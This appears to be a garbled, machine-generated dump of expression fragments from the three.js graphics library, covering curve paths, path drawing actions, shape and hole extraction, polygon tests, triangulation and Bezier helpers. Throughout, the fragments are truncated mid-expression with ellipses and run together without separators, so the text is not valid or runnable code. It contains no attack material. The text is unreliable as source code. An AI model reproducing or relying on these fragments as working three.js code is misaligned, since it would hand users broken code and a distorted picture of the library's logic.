0)points[ i ].xpoints[ i ].ypoints[ i ].z || 0points[ i ].zTHREE.C ... rapPaththis.be ... path );this.be ... dpath )this.bends.push{\r\n\r\n\tv ... s;\r\n\r\n}var old ... ents );oldPts  ... ments )this.ge ... ments )if ( !b ... ;\r\n\r\n\t}!bendsbends = this.bends;bends = this.bendsil = bends.lengthbends.lengtholdPts  ...  i ] );oldPts  ... [ i ] )this.ge ... [ i ] )this.getWrapPointsbends[ i ]return oldPts;getTran ... dPointsTHREE.C ... pPointsvar bou ... gBox();bounds  ... ngBox()this.ge ... ngBox()this.getBoundingBoxvar i,  ...  xNorm;il = oldPts.lengtholdPts.lengthp = oldPts[ i ];p = oldPts[ i ]oldPts[ i ]oldX = p.x;oldX = p.xoldY = p.y;oldY = p.yxNorm = ... s.maxX;xNorm = ... ds.maxXoldX / bounds.maxXbounds.maxXxNorm = ... oldX );xNorm = ...  oldX )path.ge ...  oldX )path.getUtoTmappingvar pat ... Norm );pathPt  ... xNorm )path.ge ... xNorm )path.getPointvar nor ... Norm );normal  ... xNorm )path.getTangentnormal. ... oldY );normal. ...  oldY )normal. ... yScalarnormal. ... mal.x )-normal.ynormal.ynormal.xp.x = p ... rmal.x;p.x = p ... ormal.xpathPt.x + normal.xpathPt.xp.y = p ... rmal.y;p.y = p ... ormal.ypathPt.y + normal.ypathPt.yTHREE.G ... );\r\n\r\n}THREE.GyroscopeTHREE.G ... type );THREE.G ... otype )THREE.G ... ixWorldthis.ma ... orld );this.ma ... World )this.tr ... onWorldthis.quaternionWorldthis.scaleWorldthis.ma ... ject );this.ma ... bject )this.tr ... nObjectthis.qu ... nObjectthis.scaleObjectTHREE.G ... tor3();THREE.G ... ctor3()THREE.G ... onWorldTHREE.G ... nObjectTHREE.G ... nion();THREE.G ... rnion()THREE.G ... leWorldTHREE.G ... eObject{\r\n\r\n\tT ... \t}\r\n\r\n}THREE.C ... (this);THREE.C ... l(this)THREE.CurvePath.callthis.actions = [];this.actions = []this.actionsif ( po ... ;\r\n\r\n\t}this.fr ... ints );this.fr ... oints )this.fromPointsTHREE.Path.prototypeTHREE.P ... se'\r\n};THREE.P ... pse'\r\n}THREE.PathActions{\r\n\r\n\tM ... pse'\r\n}MOVE_TO: 'moveTo'LINE_TO: 'lineTo'QUADRAT ... urveTo'BEZIER_ ... urveTo'CSPLINE ... neThru'ARC: 'arc'ELLIPSE: 'ellipse'THREE.P ... };\r\n\r\n}THREE.P ... mPointsthis.mo ...  ].y );this.mo ... 0 ].y )this.moveTovectors[ 0 ].xvectors[ 0 ]vectors[ 0 ].yv < vlenvlen =  ... .lengthvectors.lengththis.li ...  ].y );this.li ... v ].y )this.lineTovectors[ v ].xvectors[ v ]vectors[ v ].yTHREE.P ... .moveTovar arg ... ents );args =  ... ments )Array.p ... ments )this.ac ... gs } );this.ac ... rgs } )this.actions.push{ actio ...  args }action: ... MOVE_TOTHREE.P ... MOVE_TOargs: argsTHREE.P ... .lineTovar las ... ].args;lastarg ...  ].argsthis.ac ...  ].argsthis.ac ... h - 1 ]this.ac ... gth - 1this.actions.lengthvar x0  ...  - 2 ];x0 = la ... h - 2 ]lastarg ... h - 2 ]lastargs.length - 2lastargs.lengthvar y0  ...  - 1 ];y0 = la ... h - 1 ]lastarg ... h - 1 ]lastargs.length - 1var cur ...  y ) );curve = ... , y ) )new THR ... , y ) )new THR ... 0, y0 )new THR ...  x, y )action: ... LINE_TOTHREE.P ... LINE_TOTHREE.P ... CurveTovar cur ... aY ) );curve = ...  aY ) )new THR ...  aY ) )THREE.Q ... erCurvenew THR ...  aCPy )new THR ... X, aY )action: ... URVE_TOTHREE.P ... URVE_TOTHREE.C ... erCurvenew THR ... aCP1y )new THR ... aCP2y )THREE.P ... ineThruvar npt ... y0 ) ];npts =  ...  y0 ) ][ new T ...  y0 ) ]Array.p ...  pts );Array.p ... , pts )var cur ... npts );curve = ...  npts )new THR ...  npts )THREE.SplineCurveaction: ... NE_THRUTHREE.P ... NE_THRUTHREE.P ... \r\n\r\n };THREE.P ... ;\r\n\r\n }THREE.P ... ype.arcfunctio ... ;\r\n\r\n }{\r\n\r\n\tv ... ;\r\n\r\n }lastarg ... 1].argsthis.ac ... 1].argsthis.ac ... th - 1]this.ab ... wise );this.ab ... kwise )this.absarcaX + x0aY + y0THREE.P ... );\r\n };THREE.P ... e);\r\n }THREE.P ... .absarcfunctio ... e);\r\n }{\r\n\tthi ... e);\r\n }this.ab ... kwise);this.ab ... ckwise)this.absellipseTHREE.P ... ellipsevar cur ... wise );curve = ... kwise )new THR ... kwise )THREE.EllipseCurvevar las ... int(1);lastPoi ... oint(1)curve.getPoint(1)curve.getPointargs.pu ... int.x);args.pu ... oint.x)args.pushlastPoint.xargs.pu ... int.y);args.pu ... oint.y)lastPoint.yaction: ... ELLIPSETHREE.P ... ELLIPSETHREE.P ... s;\r\n\r\n}THREE.P ... dPointsif ( !  ... s = 40;! divisionsdivisions = 40;divisions = 40i < divisionspoints. ... ns ) );points. ... ons ) )i / divisionsreturn points;THREE.P ... tPointsif (thi ...  );\r\n\t}this.useSpacedPoints{\r\n\t\tco ...  );\r\n\t}console.log('tata');console.log('tata')tatareturn  ... Path );this.ge ... dPath )divisio ...  || 12;divisio ... s || 12divisions || 12var i,  ... , args;var cpx ... tx, ty;for ( i ... h\r\n\r\n\t}{\r\n\r\n\t\t ... h\r\n\r\n\t}item =  ... s[ i ];item =  ... ns[ i ]this.actions[ i ]action  ... action;action = item.actionitem.actionargs = item.args;args = item.argsitem.argsswitch( ... \r\n\r\n\t\t}case TH ... \tbreak;points. ...  ] ) );points. ... 1 ] ) )new THR ... [ 1 ] )args[ 0 ]args[ 1 ]cpx  = args[ 2 ];cpx  = args[ 2 ]args[ 2 ]cpy  = args[ 3 ];cpy  = args[ 3 ]args[ 3 ]cpx1 = args[ 0 ];cpx1 = args[ 0 ]cpy1 = args[ 1 ];cpy1 = args[ 1 ]points[ ... h - 1 ]points.length - 1laste = ... ].args;laste = ...  ].argsthis.ac ... i - 1 ]cpx0 =  ...  - 2 ];cpx0 =  ... h - 2 ]laste[  ... h - 2 ]laste.length - 2laste.lengthcpy0 =  ...  - 1 ];cpy0 =  ... h - 1 ]laste[  ... h - 1 ]laste.length - 1j <= divisionst = j / divisions;t = j / divisionsj / divisionstx = TH ...  cpx );ty = TH ...  cpy );points. ... ty ) );points. ...  ty ) )new THR ... x, ty )cpx  = args[ 4 ];cpx  = args[ 4 ]args[ 4 ]cpy  = args[ 5 ];cpy  = args[ 5 ]args[ 5 ]cpx2 = args[ 2 ];cpx2 = args[ 2 ]cpy2 = args[ 3 ];cpy2 = args[ 3 ]var las ...  1 ] );last =  ... - 1 ] )new THR ... - 1 ] )var spts = [ last ];spts = [ last ][ last ]n = div ... .lengthdivisio ... .lengthargs[ 0 ].lengthspts =  ...  0 ] );spts =  ... [ 0 ] )spts.co ... [ 0 ] )spts.concatvar spl ... spts );spline  ...  spts )new THR ...  spts )j <= npoints. ... n ) ) ;points. ... / n ) )spline. ... j / n )spline.getPointAtj / ncase TH ...  break;THREE.P ... ons.ARCvar aX  ... s[ 5 ];aX = args[ 0 ]aY = args[ 1 ]aRadius = args[ 2 ]aStartA ... gs[ 3 ]aEndAng ... gs[ 4 ]aClockw ... gs[ 5 ]!!args[ 5 ]!args[ 5 ]var del ... tAngle;deltaAn ... rtAngleaEndAng ... rtAnglevar angle;var tdi ... ns * 2;tdivisi ... ons * 2divisions * 2j <= tdivisionst = j / tdivisions;t = j / tdivisionsj / tdivisions! aClockwiset = 1 - t;t = 1 - tangle = ... aAngle;angle = ... taAngleaStartA ... taAnglet * deltaAngletx = aX ... ngle );tx = aX ... angle )aX + aR ... angle )aRadius ... angle )ty = aY ... ngle );ty = aY ... angle )aY + aR ... angle )var aX  ... s[ 6 ];xRadius = args[ 2 ]yRadius = args[ 3 ]aStartA ... gs[ 4 ]aEndAng ... gs[ 5 ]aClockw ... gs[ 6 ]!!args[ 6 ]!args[ 6 ]args[ 6 ]aX + xR ... angle )xRadius ... angle )aY + yR ... angle )yRadius ... angle )var las ... h - 1];lastPoi ... th - 1]points[ ... th - 1]if ( Ma ...  1, 1);Math.ab ... EPSILONMath.ab ...  0 ].x)lastPoi ... [ 0 ].xpoints[ 0 ].xMath.ab ...  0 ].y)lastPoi ... [ 0 ].ypoints[ 0 ].ypoints. ...  1, 1);points. ... - 1, 1)points.spliceif ( cl ... ;\r\n\r\n\t}points. ...  0 ] );points. ... [ 0 ] )THREE.P ... oShapes{\r\n\r\n\tf ... s;\r\n\r\n}functio ... hs;\r\n\t}{\r\n\r\n\t\t ... hs;\r\n\t}var sub ... Path();subPaths = []lastPat ... .Path()inActions.lengthinActions[ i ]action  ... MOVE_TOif ( la ... \r\n\t\t\t\t}lastPat ... th != 0lastPat ... .lengthlastPath.actionssubPath ... Path );subPath ... tPath )subPaths.pushlastPat ... Path();lastPat ... args );lastPat ...  args )lastPat ... ].applylastPath[ action ]if ( la ... \r\n\r\n\t\t}return\tsubPaths;functio ... es;\r\n\t}{\r\n\r\n\t\t ... es;\r\n\t}for ( v ... );\r\n\t\t}inSubpaths.lengthvar tmp ... s[ i ];tmpPath ... hs[ i ]inSubpaths[ i ]var tmp ... hape();tmpShap ... Shape()new THREE.Shape()tmpShap ... ctions;tmpShap ... actionstmpShape.actionstmpPath.actionstmpShap ... curves;tmpShap ... .curvestmpShape.curvestmpPath.curvesshapes. ... hape );shapes. ... Shape )shapes.pushfunctio ... de;\r\n\t}{\r\n\t\tva ... de;\r\n\t}var pol ... length;polyLen ... .lengthinPolygon.lengthvar inside = false;inside = falseq < polyLenvar p = ... , q = 0p = polyLen - 1polyLen - 1var edg ... n[ p ];edgeLow ... on[ p ]inPolygon[ p ]var edg ... n[ q ];edgeHig ... on[ q ]inPolygon[ q ]var edg ... owPt.x;edgeDx  ... LowPt.xedgeHig ... LowPt.xedgeHighPt.xedgeLowPt.xvar edg ... owPt.y;edgeDy  ... LowPt.yedgeHig ... LowPt.yedgeHighPt.yedgeLowPt.yif ( Ma ... ;\r\n\t\t\t}Math.abs(edgeDy){\t\t\t//  ... }\r\n\t\t\t}if ( ed ... \r\n\t\t\t\t}edgeDy < 0edgeLow ... n[ q ];edgeLow ... on[ q ]edgeDx = -edgeDx;edgeDx = -edgeDx-edgeDxedgeHig ... n[ p ];edgeHig ... on[ p ]edgeDy = -edgeDy;edgeDy = -edgeDy-edgeDy( inPt. ... hPt.y )( inPt. ... wPt.y )inPt.y < edgeLowPt.yinPt.yinPt.y  ... ighPt.yinPt.y  ... LowPt.yif ( in ... n\ttrue;inPt.x  ... LowPt.xinPt.xreturn\ttrue;var per ... wPt.y);perpEdg ... owPt.y)edgeDy  ... owPt.y)edgeDy  ... owPt.x)(inPt.x ... owPt.x)inPt.x - edgeLowPt.xedgeDx  ... owPt.y)(inPt.y ... owPt.y)inPt.y - edgeLowPt.yif ( pe ... n\ttrue;perpEdge == 0if ( pe ... ntinue;perpEdge < 0inside = !inside;inside = !inside!inside{\t\t// p ... ;\r\n\t\t\t}if ( (  ... n\ttrue;( ( edg ... t.x ) )( edgeH ... wPt.x )( edgeH ... nPt.x )edgeHig ...  inPt.x( inPt. ... wPt.x )( edgeL ... hPt.x )( edgeL ... nPt.x )edgeLow ...  inPt.x( inPt. ... hPt.x )inPt.x  ... ighPt.xreturn\tinside;var sub ... ions );subPath ... tions )extract ... tions )if ( su ... urn [];subPaths.length == 0subPaths.lengthreturn [];if ( no ... aths );noHoles === truereturn\t ... aths );toShape ... Paths )var sol ... s = [];if ( su ... ;\r\n\r\n\t}subPaths.length == 1tmpPath ... ths[0];tmpPath ... aths[0]subPaths[0]tmpShap ... hape();var hol ... ts() );holesFi ... nts() )!THREE. ... nts() )THREE.S ... nts() )THREE.S ... ockWisesubPath ... oints()subPath ... tPointssubPaths[ 0 ]holesFi ... sFirst;holesFi ... esFirstisCCW ? ... esFirst!holesFirstvar bet ... s = [];betterS ... es = []var newShapes = [];newShapes = []newShapeHoles = []var mainIdx = 0;mainIdx = 0var tmpPoints;newShap ... efined;newShap ... definednewShapes[mainIdx]newShap ... ] = [];newShap ... x] = []newShap ... ainIdx]for ( i ... }\r\n\r\n\t}il = subPaths.lengthtmpPath ... s[ i ];subPaths[ i ]tmpPoin ... ints();tmpPoin ... oints()tmpPath.getPoints()tmpPath.getPointssolid = ... ints );solid = ... oints )THREE.S ... oints )solid = ...  solid;solid = ... : solidisCCW ? ... : solid!solidif ( (! ... nIdx++;(! hole ... nIdx] )(! holesFirst )! holesFirst( newSh ... nIdx] )mainIdx++;mainIdx++newShap ... ints };newShap ... oints }{ s: ne ... oints }s: new THREE.Shape()p: tmpPointsnewShap ... ctions;newShap ... actionsnewShapes[mainIdx].snewShap ... curves;newShap ... .curvesif ( ho ... nIdx++;newShap ... 0] } );newShap ... [0] } )newShap ... x].push{ h: tm ... ts[0] }h: tmpPathp: tmpPoints[0]tmpPoints[0]if ( !n ... aths );!newShapes[0]newShapes[0]if ( ne ... \t\t}\r\n\t}newShapes.length > 1newShapes.length{\r\n\t\tva ... \t\t}\r\n\t}var amb ...  false;ambigious = falsevar toChange = [];toChange = []for (va ... ];\r\n\t\t}sIdx < sLensIdx++var sId ... .lengthsIdx = 0sLen =  ... .length{\r\n\t\t\tb ... ];\r\n\t\t}betterS ... ] = [];betterS ... x] = []betterS ... s[sIdx]for (va ... \t}\r\n\t\t}var sh  ... [sIdx];sh = newShapes[sIdx]newShapes[sIdx]var sho ... [sIdx];sho = n ... s[sIdx]newShapeHoles[sIdx]for (va ... }\r\n\t\t\t}hIdx < sho.lengthsho.lengthhIdx++var hIdx = 0hIdx = 0var ho = sho[hIdx];ho = sho[hIdx]sho[hIdx]var hol ... = true;hole_un ...  = truefor (va ... \r\n\t\t\t\t}s2Idx < ... .lengths2Idx++var s2Idx = 0s2Idx = 0if ( is ... \n\t\t\t\t\t}isPoint ... dx].p )ho.pnewShapes[s2Idx].pnewShapes[s2Idx]if ( sI ... dx } );sIdx != s2IdxtoChang ... dx } );toChang ... Idx } )toChange.push{ froms ...  hIdx }froms: sIdxtos: s2Idxhole: hIdxif ( ho ... \t\t\t\t\t\t}hole_un ...  false;hole_un ... = falsebetterS ... ( ho );betterS ... h( ho )betterS ... x].pushbetterS ... [s2Idx]ambigious = true;ambigious = trueif ( ho ... ho ); }{ bette ... ho ); }if ( to ... s;\r\n\t\t}toChange.length > 0toChange.length{\r\n\t\t\t/ ... s;\r\n\t\t}if (! a ... eHoles;! ambigiousnewShap ... eHoles;newShap ... peHolesvar tmpHoles, j, jl;for ( i ... \t\t}\r\n\t}il = ne ... .length{\r\n\t\ttm ... \t\t}\r\n\t}tmpShap ... s[i].s;tmpShap ... es[i].snewShapes[i].snewShapes[i]tmpHole ... les[i];tmpHole ... oles[i]newShapeHoles[i]for ( j ... );\r\n\t\t}jl = tmpHoles.lengthtmpHoles.length{\r\n\t\t\tt ... );\r\n\t\t}tmpShap ... j].h );tmpShap ... [j].h )tmpShape.holes.pushtmpShape.holestmpHoles[j].htmpHoles[j]THREE.P ... ents );THREE.P ... ments )THREE.Path.applythis.holes = [];this.holes = []this.holesTHREE.S ... d;\r\n\r\n}THREE.S ... extrudefunctio ... d;\r\n\r\n}{\r\n\r\n\tv ... d;\r\n\r\n}var ext ... ions );extrude ... tions )new THR ... tions )THREE.E ... eometryreturn extruded;THREE.S ... y;\r\n\r\n}THREE.S ... eometryvar geo ... ions );geometr ... tions )THREE.ShapeGeometryTHREE.S ... s;\r\n\r\n}THREE.S ... tsHolesthis.holes.lengthholesPts = []holesPt ... ends );holesPt ... bends )holesPts[ i ]this.ho ... bends )this.ho ... dPointsthis.holes[ i ]return holesPts;THREE.S ... lPoints{\r\n\r\n\tr ... };\r\n\r\n}shape:  ... sions )this.ge ... dPointsholes:  ... sions )this.getPointsHolesTHREE.S ... tPointsif (thi ... s);\r\n\t}{\r\n\t\tre ... s);\r\n\t}return  ... sions);this.ex ... isions)this.ex ... dPointsextract ... dPointsthis.ex ... lPointsTHREE.S ... dPointsthis.ge ... tsHolestriangu ... ;\r\n\r\n\t}functio ... \t}\r\n\t\t}point_i ... D_colin{\r\n\t\t\t/ ... \t}\r\n\t\t}if ( in ... }\r\n\t\t\t}inSegPt ... egPt2.xinSegPt1.xinSegPt2.xreturn\t ... .x ) );( ( inS ... 2.x ) )( inSeg ... Pt2.x )( inSeg ... rPt.x )inSegPt ... herPt.xinOtherPt.x( inOth ... Pt2.x )inOther ... egPt2.x( ( inS ... 1.x ) )( inSeg ... Pt1.x )( inOth ... Pt1.x )inOther ... egPt1.xinSegPt ... egPt2.yinSegPt1.yinSegPt2.yreturn\t ... .y ) );( ( inS ... 2.y ) )( inSeg ... Pt2.y )( inSeg ... rPt.y )inSegPt ... herPt.yinOtherPt.y( inOth ... Pt2.y )inOther ... egPt2.y( ( inS ... 1.y ) )( inSeg ... Pt1.y )( inOth ... Pt1.y )inOther ... egPt1.yinterse ... ents_2DinExclu ... entSegsvar seg ... 1Pt1.y;seg1dx  ... g1Pt1.xinSeg1P ... g1Pt1.xinSeg1Pt2.xinSeg1Pt1.xseg1dy  ... g1Pt1.yinSeg1P ... g1Pt1.yinSeg1Pt2.yinSeg1Pt1.yvar seg ... 2Pt1.y;seg2dx  ... g2Pt1.xinSeg2P ... g2Pt1.xinSeg2Pt2.xinSeg2Pt1.xseg2dy  ... g2Pt1.yinSeg2P ... g2Pt1.yinSeg2Pt2.yinSeg2Pt1.yvar seg ... 2Pt1.x;seg1seg ... g2Pt1.xinSeg1P ... g2Pt1.xseg1seg ... g2Pt1.yinSeg1P ... g2Pt1.yvar lim ... seg2dy;limit\t\t ...  seg2dyseg1dy  ...  seg2dyseg1dy * seg2dxseg1dx * seg2dyvar per ... seg2dy;perpSeg ... 1seg2dyseg1dy  ... 1seg2dyseg1dy * seg1seg2dxseg1dx * seg1seg2dyif ( Ma ... }\r\n\t\t\t}Math.abs(limit){\t\t\t//  ... \n\r\n\t\t\t}var perpSeg2;limit > 0if ( (  ... urn [];( perpS ... limit )( perpSeg1 < 0 )perpSeg1 < 0( perpSeg1 > limit )perpSeg1 > limitperpSeg ... seg2dy;seg2dy  ... 1seg2dyseg2dy * seg1seg2dxseg2dx * seg1seg2dy( perpSeg2 < 0 )perpSeg2 < 0( perpSeg2 > limit )perpSeg2 > limit( perpSeg1 > 0 )perpSeg1 > 0( perpSeg1 < limit )perpSeg1 < limit( perpSeg2 > 0 )perpSeg2 > 0( perpSeg2 < limit )perpSeg2 < limitif ( pe ... \r\n\t\t\t\t}perpSeg2 == 0( inExc ... mit ) )( inExc ... tSegs )( ( per ... mit ) )( perpSeg1 == 0 )perpSeg1 == 0perpSeg1 == limitreturn  ... 1Pt1 ];[ inSeg1Pt1 ]perpSeg2 == limitreturn  ... 1Pt2 ];[ inSeg1Pt2 ]if ( pe ... 2Pt1 ];return  ... 2Pt1 ];[ inSeg2Pt1 ]if ( pe ... 2Pt2 ];return  ... 2Pt2 ];[ inSeg2Pt2 ]var fac ...  limit;factorS ... / limitperpSeg2 / limitreturn\t ... dy } ];[ { x:  ... 1dy } ]{ x: in ... eg1dy }x: inSe ...  seg1dxinSeg1P ...  seg1dxfactorSeg1 * seg1dxy: inSe ...  seg1dyinSeg1P ...  seg1dyfactorSeg1 * seg1dy{\t\t// p ... }\r\n\t\t\t}( perpS ... eg2dy )( perpSeg1 != 0 )perpSeg1 != 0( seg2d ... eg2dy )var seg ... = 0) );seg1Pt  ... == 0) )( (seg1 ... == 0) )(seg1dx ... y == 0)(seg1dx == 0)seg1dx == 0(seg1dy == 0)seg1dy == 0seg2Pt  ... == 0) )( (seg2 ... == 0) )(seg2dx ... y == 0)(seg2dx == 0)seg2dx == 0(seg2dy == 0)seg2dy == 0if ( se ... \r\n\t\t\t\t}seg1Pt && seg2Ptif ( (i ... urn [];(inSeg1 ... 2Pt1.y)(inSeg1 ... 2Pt1.x)if (! p ... urn [];! point ... g1Pt1 )point_i ... g1Pt1 )! point ... g2Pt1 )point_i ... g2Pt1 )var seg ... maxVal;if (seg ... \r\n\t\t\t\t}seg1dx != 0{\t\t// t ... \r\n\t\t\t\t}if ( in ... \n\t\t\t\t\t}inSeg1P ... g1Pt2.xseg1min = inSeg1Pt1;seg1min = inSeg1Pt1seg1min ... 1Pt1.x;seg1min ... g1Pt1.xseg1max = inSeg1Pt2;seg1max = inSeg1Pt2seg1max ... 1Pt2.x;seg1max ... g1Pt2.xseg1min = inSeg1Pt2;seg1min = inSeg1Pt2seg1min ... 1Pt2.x;seg1min ... g1Pt2.xseg1max = inSeg1Pt1;seg1max = inSeg1Pt1seg1max ... 1Pt1.x;seg1max ... g1Pt1.xinSeg2P ... g2Pt2.xseg2min = inSeg2Pt1;seg2min = inSeg2Pt1seg2min ... 2Pt1.x;seg2min ... g2Pt1.xseg2max = inSeg2Pt2;seg2max = inSeg2Pt2seg2max ... 2Pt2.x;seg2max ... g2Pt2.xseg2min = inSeg2Pt2;seg2min = inSeg2Pt2seg2min ... 2Pt2.x;seg2min ... g2Pt2.xseg2max = inSeg2Pt1;seg2max = inSeg2Pt1seg2max ... 2Pt1.x;seg2max ... g2Pt1.x{\t\t\t\t// ... \r\n\t\t\t\t}inSeg1P ... g1Pt2.yseg1min ... 1Pt1.y;seg1min ... g1Pt1.yseg1max ... 1Pt2.y;seg1max ... g1Pt2.yseg1min ... 1Pt2.y;seg1min ... g1Pt2.yseg1max ... 1Pt1.y;seg1max ... g1Pt1.yinSeg2P ... g2Pt2.yseg2min ... 2Pt1.y;seg2min ... g2Pt1.yseg2max ... 2Pt2.y;seg2max ... g2Pt2.yseg2min ... 2Pt2.y;seg2min ... g2Pt2.yseg2max ... 2Pt1.y;seg2max ... g2Pt1.yseg1min ... 2minValif ( se ... urn [];seg1max ... 2minValif ( se ... \n\t\t\t\t\t}if ( in ... urn [];return [ seg2min ];[ seg2min ]if ( se ... 1max ];seg1max ... 2maxValreturn  ... 1max ];[ seg2min, seg1max ]return\t ... 2max ];[ seg2min, seg2max ]seg1min ... 2maxValreturn [ seg1min ];[ seg1min ][ seg1min, seg1max ][ seg1min, seg2max ]var leg ... rtex.y;legFrom ... ertex.xinLegFr ... ertex.xinLegFromPt.xinVertex.xlegFrom ... ertex.yinLegFr ... ertex.yinLegFromPt.yinVertex.ylegToPt ... ertex.xinLegTo ... ertex.xinLegToPt.xlegToPt ... ertex.yinLegTo ... ertex.yinLegToPt.yvar oth ... rtex.y;otherPt ... ertex.xinOther ... ertex.xotherPt ... ertex.yinOther ... ertex.yvar fro ... gToPtX;from2to ... egToPtXlegFrom ... egToPtXlegFrom ... egToPtYvar fro ... herPtX;from2ot ... therPtXlegFrom ... therPtXlegFrom ... therPtYMath.ab ... oAngle)var oth ... gToPtX;other2t ... egToPtXotherPt ... egToPtXotherPtX * legToPtYotherPtY * legToPtXif ( fr ... \r\n\t\t\t\t}from2toAngle > 0return\t ...  0 ) );( ( fro ... = 0 ) )( from2 ...  >= 0 )from2otherAngle >= 0( other ...  >= 0 )other2toAngle >= 0{\t\t\t\t\t\t ... \r\n\t\t\t\t}{\t\t\t\t\t\t ... ;\r\n\t\t\t}return\t ...  > 0 );( from2 ... e > 0 )from2otherAngle > 0functio ... */\r\n\t\t}var sha ... ncat();shape = ... oncat()contour.concat()contour.concatvar hole;isCutLi ... eAnglesvar las ... th - 1;lastSha ... gth - 1shape.length - 1shape.lengthvar pre ... dx - 1;prevSha ... Idx - 1inShapeIdx - 1if ( pr ... apeIdx;prevShapeIdx < 0prevSha ... apeIdx;prevSha ... hapeIdxvar nex ... dx + 1;nextSha ... Idx + 1inShapeIdx + 1if ( ne ... dx = 0;nextSha ... hapeIdxnextShapeIdx = 0;nextShapeIdx = 0var ins ... Idx] );insideA ... eIdx] )isPoint ... eIdx] )shape[inShapeIdx]shape[  ... peIdx ]hole[inHoleIdx]if (! i ... \r\n\t\t\t\t}! insideAnglereturn\tfalse;lastHol ... gth - 1hole.length - 1hole.lengthprevHol ... Idx - 1inHoleIdx - 1if ( pr ... oleIdx;prevHoleIdx < 0prevHol ... oleIdx;prevHol ... HoleIdxnextHol ... Idx + 1inHoleIdx + 1nextHol ... HoleIdxnextHoleIdx = 0;nextHoleIdx = 0insideA ... Idx] );hole[ prevHoleIdx ]hole[ nextHoleIdx ]var sId ... ection;for ( s ... \r\n\t\t\t\t}sIdx < shape.lengthnextIdx = sIdx+1;nextIdx = sIdx+1sIdx+1nextIdx ... length;nextIdx ... .lengthinterse ... true );shape[sIdx]shape[nextIdx]interse ... gth > 0intersection.lengthvar indepHoles = [];indepHoles = []var ihI ... ection;ihIdx < ... .lengthindepHoles.lengthihIdx++ihIdx = 0chkHole ... hIdx]];chkHole ... ihIdx]]holes[i ... ihIdx]]indepHoles[ihIdx]for ( h ... \n\t\t\t\t\t}hIdx <  ... .lengthchkHole.lengthnextIdx = hIdx+1;nextIdx = hIdx+1hIdx+1chkHole[hIdx]chkHole[nextIdx]var hol ... pHole2;failedCuts = []h < hlh ++var h = ... .lengthh = 0hl = holes.lengthholes.lengthindepHo ... h( h );indepHoles.push( h )indepHoles.pushvar min ... ex = 0;minShapeIndex = 0var cou ... th * 2;counter ... gth * 2indepHo ... gth * 2while ( ... }\r\n\t\t\t}indepHo ... gth > 0counter --;counter --counter < 0console ... pe!" );console ... ape!" )"Infini ... Shape!""Infini ... .length"Infini ...  left:"Infinite Loop! Holes left:", Prob ... Shape!", Probably Hole outside Shape!shapeIn ... .lengthshapeIndex++shapeIn ... peIndexshapePt ... ndex ];shapePt ... Index ]shape[ shapeIndex ]holeIndex\t= -1;holeIndex\t= -1h < ind ... .lengthvar h = 0holeIdx ... les[h];holeIdx ... oles[h]indepHoles[h]cutKey  ... oleIdx;cutKey  ... holeIdxshapePt ... holeIdxshapePt ... y + ":"shapePt ... apePt.yshapePt.x + ":"shapePt.xshapePt.yif ( fa ... ntinue;failedC ... definedfailedCuts[cutKey]hole =  ... leIdx];hole =  ... oleIdx]holes[holeIdx]h2 < hole.lengthh2 ++var h2 = 0h2 = 0holePt = hole[ h2 ];holePt = hole[ h2 ]hole[ h2 ]if (! i ... ntinue;! isCut ... x, h2 )isCutLi ... x, h2 )interse ... olePt )holeIndex = h2;holeIndex = h2indepHo ... e(h,1);indepHo ... ce(h,1)indepHoles.splicetmpShap ... ex+1 );tmpShap ... dex+1 )shape.s ... dex+1 )shape.sliceshapeIndex+1tmpShap ... ndex );tmpShap ... Index )shape.s ... Index )tmpHole ... ndex );tmpHole ... Index )hole.sl ... Index )hole.slicetmpHole ... ex+1 );tmpHole ... dex+1 )hole.sl ... dex+1 )holeIndex+1shape = ... ape2 );shape = ... hape2 )tmpShap ... hape2 )tmpShap ... .concattmpShap ... Hole2 )tmpShap ... Hole1 )tmpShape1.concatminShap ... eIndex;minShap ... peIndexif ( ho ... \tbreak;holeIndex >= 0failedC ... = true;failedC ...  = truereturn shape;var i,  ... p = {};allPointsMap = {}var all ... ncat();allpoin ... oncat()Array.p ... s[h] );Array.p ... es[h] )holes[h]il = al ... .lengthallpoints.lengthkey = a ...  i ].y;key = a ... [ i ].yallpoin ... [ i ].yallpoin ... x + ":"allpoints[ i ].xallpoints[ i ]allpoints[ i ].yallPoin ... definedallPointsMap[ key ]console ...  key );console ... , key )Duplicate pointallPoin ...  ] = i;allPoin ... y ] = ivar sha ... oles );shapeWi ... holes )removeH ... holes )var tri ... alse );triangl ... false )THREE.F ... false )THREE.F ... ngulateil = tr ... .lengthtriangles.lengthtriangles[ i ]f < 3key = f ...  f ].y;key = f ... [ f ].yface[ f ... [ f ].yface[ f ].x + ":"face[ f ].xface[ f ]face[ f ].yindex = ...  key ];index = ... [ key ]index !== undefinedface[ f ] = index;face[ f ] = indexreturn  ... ncat();triangles.concat()triangles.concatisClock ... ;\r\n\r\n\t}THREE.F ... s ) < 0THREE.F ... ( pts )THREE.F ... te.areab2p0: f ... ;\r\n\r\n\t}var k = 1 - t;k = 1 - treturn k * k * p;k * k * pk * kb2p1: f ... ;\r\n\r\n\t}return  ...  t * p;2 * ( 1 ... * t * p2 * ( 1 - t ) * tb2p2: f ... ;\r\n\r\n\t}return t * t * p;t * t * pb2: fun ... ;\r\n\r\n\t}return  ... , p2 );this.b2 ... t, p2 )this.b2 ... t, p1 )this.b2p0( t, p0 )this.b2p0this.b2p1( t, p1 )this.b2p1this.b2p2( t, p2 )this.b2p2b3p0: f ... ;\r\n\r\n\t}return  ...  k * p;k * k * k * pk * k * kb3p1: f ... ;\r\n\r\n\t}3 * k * k * t * p3 * k * k * t3 * k * k3 * kb3p2: f ... ;\r\n\r\n\t}3 * k * t * t * p3 * k * t * t3 * k * tb3p3: f ... ;\r\n\r\n\t}t * t * t * pt * t * tb3: fun ... ;\r\n\r\n\t}return  ... , p3 );this.b3 ... t, p3 )this.b3 ... t, p2 )this.b3 ... t, p1 )this.b3p0( t, p0 )this.b3p0this.b3p1( t, p1 )this.b3p1this.b3p2( t, p2 )this.b3p2this.b3p3( t, p3 )this.b3p3THREE.L ... 2;\r\n\r\n}functio ... 2;\r\n\r\n}{\r\n\r\n\tt ... 2;\r\n\r\n}this.v1 = v1;this.v1 = v1this.v2 = v2;this.v2 = v2THREE.L ... etPointvar poi ... is.v1);point = ... his.v1)this.v2 ... his.v1)this.v2.clone().subthis.v2.clone()this.v2.clonepoint.m ... s.v1 );point.m ... is.v1 )point.m ... t ).addpoint.m ... ar( t )THREE.L ... PointAtthis.getPoint( u )THREE.L ... Tangentvar tan ... is.v1);tangent ... his.v1)tangent.normalize()tangent.normalizeTHREE.Q ... 2;\r\n\r\n}this.v0 = v0;this.v0 = v0this.v0THREE.Q ... type 